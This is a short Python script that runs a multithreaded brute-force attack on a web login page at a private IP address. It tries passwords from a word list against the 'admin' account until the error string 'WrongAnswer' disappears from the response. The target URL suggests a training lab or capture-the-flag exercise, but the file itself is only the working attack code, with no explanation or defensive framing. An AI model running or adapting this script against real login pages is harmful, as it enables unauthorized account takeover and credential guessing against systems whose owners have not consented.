#!/usr/bin/env python3

import time
import requests
import threading


base = "http://10.11.249.210/?page=signin&Login=Login"

answ = []

def chunks(lst, n):
	for i in range(0, len(lst), n):
		yield lst[i:i + n]

def chunks2(lst, n):
	res = []
	for i in range(n):
		res.append([])
	for i in range(0, len(lst)):
		res[i % n].append(lst[i])
	return res

def get_list():
	with open("list.txt", 'r') as file:
		lines = file.read().splitlines()

	return lines


found = False

def send_pass(partlist, idd):
	global found
	for p in partlist:
		if (found == True):
			break

		while True:
			try:
				aa = requests.get(f"{base}&username=admin&password={p}", headers={'Connection':'close'})
				break
			except requests.exceptions.ConnectionError:
				print(idd, 'Sleep')
				time.sleep(2)
				continue

		if (found == False):
			if (not 'WrongAnswer' in str(aa.content)):
				print(f"{idd} Found {p}")
				found = True
				break
			else:
				print(f"{idd} Tried {p}")
			time.sleep(0.0001)

passwords = get_list()


# send_pass(passwords, 1)


c = 10
todos = chunks2(passwords, c)
threads = []


for i in range(c):
	threads.append(threading.Thread(target=send_pass, args=(todos[i], i, )))
	threads[-1].start()

for i in range(c):
	threads[i].join()

